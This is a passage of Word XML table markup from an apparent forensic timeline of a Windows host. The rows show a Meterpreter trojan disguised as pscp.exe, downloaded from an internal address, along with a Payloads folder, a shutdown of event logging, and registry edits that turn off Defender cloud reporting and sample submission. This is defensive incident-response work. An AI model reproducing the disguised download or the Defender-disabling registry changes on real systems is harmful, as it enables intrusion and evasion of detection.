          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 19:00:23.673334</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Control\ComputerName\ComputerName</w:t>
              <w:br/>
              <w:t>System Info | System Info (Current) | ComputerName=DESKTOP-KJ81A5A</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#2177</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 19:00:23.823486</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4720 | Microsoft-Windows-Security-Auditing | A new account was created | Target: DESKTOP-KJ81A5A\defaultuser0 (S-1-5-21-1841083384-974204330-411256071-1000)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#25105</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 19:00:26.938000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: known networks</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network: first connected [local time converted to UTC, ActiveTimeBias=480 min]</w:t>
              <w:br/>
              <w:t>Network Wired passerelle=88-9E-68-2C-5B-05 DNS=hsd1.md.comcast.net</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261019151050/recmd_kroll_C_KnownNetworks.csv#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:15:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (network usage per application)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: network usage (end of period)</w:t>
              <w:br/>
              <w:t>\device\harddiskvolume4\windows\explorer.exe</w:t>
              <w:br/>
              <w:t>received=68056 sent=3284 IF_TYPE_ETHERNET_CSMACD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261019151050_SrumECmd_NetworkUsages_Output.csv#61</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-013, F-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:15:13.719781</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 1100 | Microsoft-Windows-Eventlog | The event logging service has shut down</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#25930</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:15:26.178698</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump Lists (automatic)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump List: entry created (≈ first opened)</w:t>
              <w:br/>
              <w:t>C:\Payloads</w:t>
              <w:br/>
              <w:t>Windows Explorer Windows 8.1 interactions=2 machine=desktop-kj81a5a</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>jlecmd/20261019151058_AutomaticDestinations.csv#26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\users\medmondson\Appdata\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\f01b4d95cf55d32a.automaticDestinations-ms</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-014</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:36.111277</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Browser (history, Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>history: ts</w:t>
              <w:br/>
              <w:t>http://10.0.0.12:8080/</w:t>
              <w:br/>
              <w:t>browser=iexplore | visit_count=2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/browser.history.jsonl#69</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-016, I-015, T-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:38.642518</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $SI modification (M) ; $SI MFT change (C) ; $FN access (A)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!001\MicrosoftEdge\Cache\A6816M2V\pscp[1].exe</w:t>
              <w:br/>
              <w:t>size=986624</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#114957</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-003, F-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:43.841943</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>file:_C:\Users\medmondson\Downloads\pscp.exe</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C:\Windows\System32\browser_broker.exe | Detection ID: {9D42DBC</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23714</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-003, F-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:44.708000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>critical</w:t>
              <w:br/>
              <w:t>Defender Alert (Severe) | {"Threat":"Trojan:Win64/Meterpreter.E","Severity":"Severe","Type":"Trojan","User":"DESKTOP-KJ81A5A\\medmondson","Path":"file:_C:\\Users\\medmondson\\Downloads\\pscp.exe; webfile:_C:\\Users\\medmondson\\Downloads\\pscp.exe|http://10.0.0.12:8080/pscp.exe|pid:8820,ProcessStart:133440850044617643","Proc":"C:\\Windows\\System32\\browser_broker.exe"} | {"Action ID":9,"Action Na</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#5892</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-003</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:44.708098</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>file:_C:\Users\medmondson\Downloads\pscp.exe; webfile:_C:\Users\medmondson\Downloads\pscp.exe|http://10.0.0.12:8080/pscp.exe|pid:8820,ProcessStart:133440850044617643</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C:\Windows\System32\browser_broker.exe | Detection ID: {9D42DBC</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23715</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-003, I-003, I-004, T-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:44.768538</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Downloads\pscp.exe</w:t>
              <w:br/>
              <w:t>FileDelete|Close [Archive] entry=85540-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#85220</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-014</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:52.220594</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>file:_C:\Users\medmondson\Downloads\pscp.exe; webfile:_C:\Users\medmondson\Downloads\pscp.exe|http://10.0.0.12:8080/pscp.exe|pid:8820,ProcessStart:133440850044617643</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Windows Defender/Operational 1117 | Microsoft-Windows-Windows Defender | Detection - The antimalware platform performed an action to protect your system from malware or other potentially unwanted software | Malware name: Trojan:Win64/Meterpreter.E | Description: Trojan (Severe) | Detection Time: 2023-11-10T10:16:43.470Z | Process (if real-time detection): C:\Windows\System32\brow</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23716</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-003</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:40.345882</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Defender\SpyNet\SpyNetReporting = 0x2 | New Value: HKLM\SOFTWARE\Microsoft\Windows Defender\SpyNet\SpyNetReporting = 0x0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23717</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-004</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:41.861519</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Defender\SpyNet\SubmitSamplesConsent = 0x1 | New Value: HKLM\SOFTWARE\Microsoft\Windows Defender\SpyNet\SubmitSamplesConsent = 0x0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
